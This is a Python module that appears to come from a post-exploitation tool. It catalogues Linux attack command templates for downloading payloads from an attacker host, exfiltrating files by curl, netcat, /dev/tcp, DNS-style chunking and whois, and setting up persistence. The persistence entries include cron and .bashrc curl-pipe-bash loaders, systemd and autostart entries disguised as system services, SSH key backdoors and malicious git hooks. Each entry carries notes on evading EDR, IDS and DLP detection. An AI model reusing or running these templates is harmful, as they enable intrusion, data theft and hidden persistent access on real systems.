
from commands import TechniqueEntry

LINUX_COMMANDS = {

    "download": [
        TechniqueEntry(
            name="curl (silent download)",
            binary="curl",
            template="curl -s --connect-timeout 10 -o /tmp/{filename} http://{ip}:{port}/{filename}",
            stealth_note=(
                "curl is a ubiquitous system utility present on virtually all Linux distros. "
                "-s (silent) suppresses progress output, leaving no console noise. "
                "--connect-timeout prevents indefinite hangs if target is unreachable."
            ),
            requires="curl installed (default on most distros).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="wget (quiet download)",
            binary="wget",
            template="wget -q --timeout=10 -O /tmp/{filename} http://{ip}:{port}/{filename}",
            stealth_note=(
                "wget -q runs in quiet mode with no terminal output. "
                "Disguises as legitimate package download or update traffic. "
                "--timeout prevents indefinite waits."
            ),
            requires="wget installed.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="python3 urllib download",
            binary="python3",
            template=(
                "python3 -c \"import urllib.request; "
                "urllib.request.urlretrieve('http://{ip}:{port}/{filename}', "
                "'/tmp/{filename}')\""
            ),
            stealth_note=(
                "Single-line Python avoids writing a .py script to disk. "
                "Python3 is present on virtually every modern Linux system. "
                "urllib is a standard library module — no pip install needed."
            ),
            requires="python3 available in PATH.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="bash /dev/tcp download",
            binary="bash",
            template=(
                "bash -c 'exec 3<>/dev/tcp/{ip}/{port}; "
                "echo -e \"GET /{filename} HTTP/1.0\\r\\nHost: {ip}\\r\\n\\r\\n\" >&3; "
                "sed \"1,/^\\r$/d\" <&3 > /tmp/{filename}; exec 3>&-'"
            ),
            stealth_note=(
                "Pure Bash built-in feature — no external binary spawned. "
                "Evades binary-execution based detection entirely. "
                "sed strips HTTP response headers from the downloaded content. "
                "Will fail on non-bash shells (dash, sh, zsh)."
            ),
            requires="Requires bash shell (not dash, sh, or zsh). HTTP server on attacker side.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="nc (netcat pull)",
            binary="nc",
            template="nc -w 5 {ip} {port} > /tmp/{filename}",
            stealth_note=(
                "Netcat is a standard sysadmin networking tool. "
                "Short-lived connection (-w 5 timeout) leaves minimal log footprint. "
                "Raw TCP connection has no HTTP headers or protocol signatures."
            ),
            requires="Attacker must pipe file data: nc -lvnp {port} < {filename}",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="openssl (TLS encrypted download)",
            binary="openssl",
            template="openssl s_client -quiet -connect {ip}:{port} 2>/dev/null > /tmp/{filename}",
            stealth_note=(
                "Traffic is TLS-encrypted end-to-end. "
                "DPI and IDS/IPS cannot inspect payload content. "
                "Appears as legitimate HTTPS/TLS connection in network logs."
            ),
            requires="Attacker must serve file over TLS (e.g. openssl s_server -cert cert.pem -key key.pem -quiet).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="scp (SSH file copy)",
            binary="scp",
            template="scp -P {port} -o StrictHostKeyChecking=no user@{ip}:/{filename} /tmp/{filename}",
            stealth_note=(
                "SCP uses SSH encryption — traffic is fully opaque to network inspection. "
                "SSH is commonly allowed through firewalls. "
                "-o StrictHostKeyChecking=no avoids interactive host key prompts."
            ),
            requires="SSH credentials or key on attacker machine; SSH server running on {port}.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="socat (TCP download)",
            binary="socat",
            template="socat TCP:{ip}:{port} FILE:/tmp/{filename},create",
            stealth_note=(
                "socat is an advanced bidirectional data relay tool. "
                "Supports encrypted (SSL) channels and complex routing. "
                "Less commonly monitored than curl/wget by EDR rules."
            ),
            requires="Attacker: socat FILE:{filename} TCP-LISTEN:{port}",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="php (CLI download)",
            binary="php",
            template="php -r \"file_put_contents('/tmp/{filename}', file_get_contents('http://{ip}:{port}/{filename}'));\"",
            stealth_note=(
                "PHP CLI one-liner using built-in file functions. "
                "Common on LAMP/LEMP stacks where PHP is pre-installed. "
                "No external module needed — uses core PHP stream wrappers."
            ),
            requires="php-cli installed.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="ruby (net/http download)",
            binary="ruby",
            template=(
                "ruby -e \"require 'net/http'; "
                "File.write('/tmp/{filename}', "
                "Net::HTTP.get(URI('http://{ip}:{port}/{filename}')))\""
            ),
            stealth_note=(
                "Ruby stdlib one-liner — net/http is a built-in module. "
                "Ruby is commonly installed on development servers and macOS. "
                "Process shows only 'ruby -e' with inline code."
            ),
            requires="ruby installed.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="perl (LWP download)",
            binary="perl",
            template="perl -e 'use LWP::Simple; getstore(\"http://{ip}:{port}/{filename}\", \"/tmp/{filename}\")'",
            stealth_note=(
                "Perl is present on 99%% of Linux systems and is a trusted binary. "
                "LWP::Simple is a core Perl module for HTTP operations. "
                "perl processes are commonly allow-listed in enterprise environments."
            ),
            requires="perl with LWP::Simple module installed.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="rsync (remote pull)",
            binary="rsync",
            template="rsync -avz rsync://{ip}:{port}/{filename} /tmp/{filename}",
            stealth_note=(
                "rsync is a legitimate backup and file synchronization tool. "
                "Traffic looks like routine server backup or configuration sync. "
                "rsync protocol is rarely inspected by network IDS/IPS."
            ),
            requires="Attacker must run rsync daemon (rsyncd) serving the file.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="tftp (trivial file transfer)",
            binary="tftp",
            template="tftp {ip} {port} -c get {filename}",
            stealth_note=(
                "TFTP is a simple protocol with no authentication. "
                "Commonly used for PXE boot and network device firmware updates. "
                "TFTP traffic may bypass firewalls that only inspect TCP (TFTP uses UDP)."
            ),
            requires="Attacker must run TFTP server (e.g. atftpd, tftpd-hpa).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="lwp-download (Perl CLI)",
            binary="lwp-download",
            template="lwp-download http://{ip}:{port}/{filename} /tmp/{filename}",
            stealth_note=(
                "lwp-download is a standalone Perl LWP CLI binary. "
                "It is a legitimate system tool for HTTP downloads — "
                "almost never flagged by EDR or SIEM rules."
            ),
            requires="perl-libwww-perl package installed.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="busybox (wget applet)",
            binary="busybox",
            template="busybox wget -q -O /tmp/{filename} http://{ip}:{port}/{filename}",
            stealth_note=(
                "BusyBox is a single binary providing hundreds of Unix utilities. "
                "Common on embedded systems, IoT devices, Docker containers, and minimal installs. "
                "EDR tools targeting specific binary names may miss busybox applet calls."
            ),
            requires="busybox installed.",
            privilege="user",
            detection_risk="low",
        ),
    ],

    "upload": [
        TechniqueEntry(
            name="curl HTTP POST exfil",
            binary="curl",
            template="curl -s --connect-timeout 10 -X POST http://{ip}:{port}/upload -F 'file=@/tmp/{filename}'",
            stealth_note=(
                "HTTP POST blends with web application traffic. "
                "-s suppresses output on the victim machine. "
                "Multipart form upload mimics standard web file submission."
            ),
            requires="Attacker HTTP server must accept multipart file upload (e.g. uploadserver).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="nc (raw TCP exfil)",
            binary="nc",
            template="cat /tmp/{filename} | nc -w 3 {ip} {port}",
            stealth_note=(
                "Raw TCP transfer — no HTTP headers, minimal log artifacts. "
                "-w 3 gives a 3-second timeout window for reliable transfer. "
                "No protocol signatures for IDS/IPS to match against."
            ),
            requires="Attacker listener: nc -lvnp {port} > received_{filename}",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="openssl (TLS encrypted exfil)",
            binary="openssl",
            template="openssl s_client -quiet -connect {ip}:{port} 2>/dev/null < /tmp/{filename}",
            stealth_note=(
                "TLS-encrypted raw socket. "
                "IDS/IPS sees only encrypted bytes — payload is fully opaque. "
                "Appears as legitimate HTTPS/TLS connection in network logs."
            ),
            requires=(
                "Attacker listener: openssl s_server -quiet -accept {port} "
                "-cert cert.pem -key key.pem > received_{filename}"
            ),
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="python3 base64 + HTTP POST",
            binary="python3",
            template=(
                "python3 -c \"import base64,urllib.request; "
                "data=open('/tmp/{filename}','rb').read(); "
                "urllib.request.urlopen(urllib.request.Request("
                "'http://{ip}:{port}/upload', data=base64.b64encode(data)))\""
            ),
            stealth_note=(
                "File is Base64-encoded before transmission. "
                "Naive content inspection won't recognise the original data. "
                "Single-line Python — no script file touches disk."
            ),
            requires="Attacker HTTP endpoint must accept and decode Base64.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="scp (SSH exfil)",
            binary="scp",
            template="scp -P {port} -o StrictHostKeyChecking=no /tmp/{filename} user@{ip}:/tmp/received_{filename}",
            stealth_note=(
                "SCP/SSH provides end-to-end encryption. "
                "Traffic is indistinguishable from legitimate server administration. "
                "-o StrictHostKeyChecking=no avoids interactive host key prompts."
            ),
            requires="SSH key/credentials and SSH daemon on attacker side.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="bash /dev/tcp exfil",
            binary="bash",
            template="bash -c 'cat /tmp/{filename} > /dev/tcp/{ip}/{port}'",
            stealth_note=(
                "Pure Bash built-in — no external binary spawned, evades exec-based detection. "
                "Single raw TCP stream with no protocol headers. "
                "Process tree shows only bash, not suspicious network tools."
            ),
            requires="Attacker listener: nc -lvnp {port} > received_{filename}",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="curl DNS exfil (base64 chunk)",
            binary="curl",
            template=(
                "for chunk in $(base64 -w0 /tmp/{filename} | fold -w 30); "
                "do curl -s \"http://$chunk.{ip}/\" > /dev/null 2>&1; done"
            ),
            stealth_note=(
                "File data encoded into DNS-like subdomain queries. "
                "Firewall typically allows port 80 outbound; data is buried in Host header. "
                "base64 -w0 prevents line wrapping for consistent chunking. "
                "NOTE: {ip} must be a domain name (not a dotted-quad IP) for subdomain "
                "resolution to work (e.g. attacker.com, not 192.168.1.100)."
            ),
            requires=(
                "Attacker must run an HTTP server logging all Host headers. "
                "{ip} must be a domain name, not a raw IP address."
            ),
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="socat (TCP exfil)",
            binary="socat",
            template="socat FILE:/tmp/{filename} TCP:{ip}:{port}",
            stealth_note=(
                "socat is an advanced bidirectional data relay. "
                "Supports SSL encryption natively (add ssl-verify=0 for SSL). "
                "Less commonly monitored than nc/curl by EDR."
            ),
            requires="Attacker: socat TCP-LISTEN:{port} FILE:received_{filename},create",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="tar + nc (compressed exfil)",
            binary="tar",
            template="tar czf - /tmp/{filename} | nc -w 3 {ip} {port}",
            stealth_note=(
                "Data is gzip-compressed before transfer, reducing size and "
                "completely changing file signatures. Content inspection IDS "
                "sees only gzip binary data, not the original file content."
            ),
            requires="Attacker: nc -lvnp {port} | tar xzf -",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="whois (protocol exfil)",
            binary="whois",
            template="whois -h {ip} -p {port} \"$(base64 -w0 /tmp/{filename})\"",
            stealth_note=(
                "whois is a legitimate DNS lookup tool — almost never flagged. "
                "Data is sent as a whois query to the attacker server. "
                "Extremely uncommon exfil vector — near-zero SIEM/EDR coverage. "
                "Base64 encoding prevents binary data issues in the protocol."
            ),
            requires="Attacker must run a fake whois listener: nc -lvnp {port}",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="rsync (remote exfil)",
            binary="rsync",
            template="rsync -avz /tmp/{filename} rsync://{ip}:{port}/upload/",
            stealth_note=(
                "rsync traffic looks like legitimate backup or configuration sync. "
                "rsync protocol is rarely inspected by network security tools. "
                "-z flag compresses data in transit, obscuring content."
            ),
            requires="Attacker must run rsync daemon accepting uploads.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="php (HTTP POST exfil)",
            binary="php",
            template=(
                "php -r \"\\$d=file_get_contents('/tmp/{filename}'); "
                "\\$c=curl_init('http://{ip}:{port}/upload'); "
                "curl_setopt(\\$c,CURLOPT_POST,1); "
                "curl_setopt(\\$c,CURLOPT_POSTFIELDS,\\$d); "
                "curl_exec(\\$c);\""
            ),
            stealth_note=(
                "PHP CLI one-liner using built-in cURL bindings. "
                "Common on LAMP stacks where PHP is pre-installed. "
                "PHP process is commonly allow-listed on web servers."
            ),
            requires="php-cli with curl extension installed.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="xxd + nc (hex-encoded exfil)",
            binary="xxd",
            template="xxd -p /tmp/{filename} | nc -w 3 {ip} {port}",
            stealth_note=(
                "xxd converts file to hex dump before transfer. "
                "Content inspection sees only hexadecimal characters — no file signatures, "
                "no magic bytes, no recognizable content for DLP rules."
            ),
            requires="Attacker: nc -lvnp {port} | xxd -r -p > received_{filename}",
            privilege="user",
            detection_risk="low",
        ),
    ],

    "persistence": [
        TechniqueEntry(
            name="crontab persistence",
            binary="crontab",
            template=(
                "(crontab -l 2>/dev/null; echo '@reboot curl -s "
                "http://{ip}:{port}/{filename} | bash') | crontab -"
            ),
            stealth_note=(
                "Appending to existing crontab avoids replacing legitimate cron jobs. "
                "@reboot runs on every system restart. "
                "curl -s suppresses output, bash executes the downloaded script."
            ),
            requires="curl available; cron daemon running.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="~/.bashrc persistence",
            binary="bash",
            template="echo 'nohup curl -s http://{ip}:{port}/{filename} | bash &' >> ~/.bashrc",
            stealth_note=(
                "Payload appended to .bashrc is executed every interactive bash shell. "
                "nohup + background (&) prevents blocking the user's shell startup. "
                "Hidden among potentially hundreds of lines in .bashrc."
            ),
            requires="Attacker serves payload script at URL; target uses bash shell.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="systemd user service",
            binary="systemctl",
            template=(
                "mkdir -p ~/.config/systemd/user && "
                "printf '[Unit]\\nDescription=NetworkManager Helper\\n"
                "[Service]\\nExecStart=/bin/bash -c \"curl -s http://{ip}:{port}/{filename} | bash\"\\n"
                "Restart=always\\nRestartSec=60\\n"
                "[Install]\\nWantedBy=default.target\\n' "
                "> ~/.config/systemd/user/netmgr.service && "
                "systemctl --user daemon-reload && "
                "systemctl --user enable --now netmgr.service"
            ),
            stealth_note=(
                "User-level systemd service named 'NetworkManager Helper' blends with "
                "legitimate system services. No root privileges required. "
                "Restart=always ensures automatic restart on failure. "
                "printf used instead of echo -e for cross-shell compatibility."
            ),
            requires="systemd with user session support (most modern distros).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="SSH authorized_keys backdoor",
            binary="ssh",
            template=(
                "mkdir -p ~/.ssh && curl -s http://{ip}:{port}/{filename} >> ~/.ssh/authorized_keys "
                "&& chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh"
            ),
            stealth_note=(
                "Injecting an SSH public key grants persistent passwordless access. "
                "Looks like standard SSH key management. "
                "mkdir -p ensures .ssh directory exists with correct permissions."
            ),
            requires="Remote file must contain attacker SSH public key (id_rsa.pub); SSH daemon running.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="LD_PRELOAD persistence (.profile)",
            binary="bash",
            template="echo 'export LD_PRELOAD=/tmp/{filename}' >> ~/.profile",
            stealth_note=(
                "LD_PRELOAD forces a shared library to be loaded before all others, "
                "allowing code injection into every dynamically-linked process started by this user. "
                "Only affects dynamically-linked binaries — static binaries are immune. "
                "The injected .so runs in the address space of legitimate processes."
            ),
            requires="File must be a compiled .so shared library; dropped to /tmp first via download phase.",
            privilege="user",
            detection_risk="high",
        ),
        TechniqueEntry(
            name="at (one-shot scheduled)",
            binary="at",
            template="echo 'curl -s http://{ip}:{port}/{filename} | bash' | at now + 1 minute",
            stealth_note=(
                "at is a legitimate one-shot job scheduler — less monitored than cron. "
                "Jobs do not appear in crontab listings. "
                "at queue is stored in /var/spool/atjobs/ which is rarely audited."
            ),
            requires="atd service running; curl available.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="~/.ssh/rc (SSH login hook)",
            binary="ssh",
            template=(
                "echo '#!/bin/bash' > ~/.ssh/rc && "
                "echo 'nohup curl -s http://{ip}:{port}/{filename} | bash &' >> ~/.ssh/rc && "
                "chmod +x ~/.ssh/rc"
            ),
            stealth_note=(
                "~/.ssh/rc is executed by sshd on every SSH login BEFORE the user shell. "
                "This is a legitimate SSH feature — sshd sources this file automatically. "
                "Most administrators and security tools are unaware this file exists."
            ),
            requires="SSH access to the target; attacker serves payload script.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="XDG autostart (desktop)",
            binary="bash",
            template=(
                "mkdir -p ~/.config/autostart && "
                "printf '[Desktop Entry]\\nType=Application\\nName=System Update\\n"
                "Exec=bash -c \"curl -s http://{ip}:{port}/{filename} | bash\"\\n"
                "Hidden=true\\nX-GNOME-Autostart-enabled=true\\n' "
                "> ~/.config/autostart/system-update.desktop"
            ),
            stealth_note=(
                "XDG autostart entries run on graphical desktop login (GNOME, KDE, XFCE). "
                "Named 'System Update' to blend with legitimate update services. "
                "Hidden=true prevents the application from appearing in menus. "
                "Effective on Linux workstations and VDI environments."
            ),
            requires="Target must have a graphical desktop environment (GNOME/KDE/XFCE).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="/etc/rc.local (boot script)",
            binary="bash",
            template=(
                "echo 'nohup curl -s http://{ip}:{port}/{filename} | bash &' >> /etc/rc.local && "
                "chmod +x /etc/rc.local"
            ),
            stealth_note=(
                "rc.local is a classic boot-time script executed as root. "
                "Still supported on many distros via systemd-rc-local-generator. "
                "Runs before user login, ensuring early callback."
            ),
            requires="Root/sudo access required to write to /etc/rc.local.",
            privilege="admin",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="git hooks (post-checkout)",
            binary="git",
            template=(
                "echo '#!/bin/bash' > .git/hooks/post-checkout && "
                "echo 'nohup curl -s http://{ip}:{port}/{filename} | bash &' >> .git/hooks/post-checkout && "
                "chmod +x .git/hooks/post-checkout"
            ),
            stealth_note=(
                "Git hooks are scripts that run automatically on git operations. "
                "post-checkout fires on every 'git checkout' and 'git clone'. "
                "Developers frequently use git hooks — the mechanism is legitimate. "
                "Hook scripts are inside .git/ which is often excluded from file monitoring."
            ),
            requires="Target must have a git repository; attacker serves payload script.",
            privilege="user",
            detection_risk="low",
        ),
    ],
}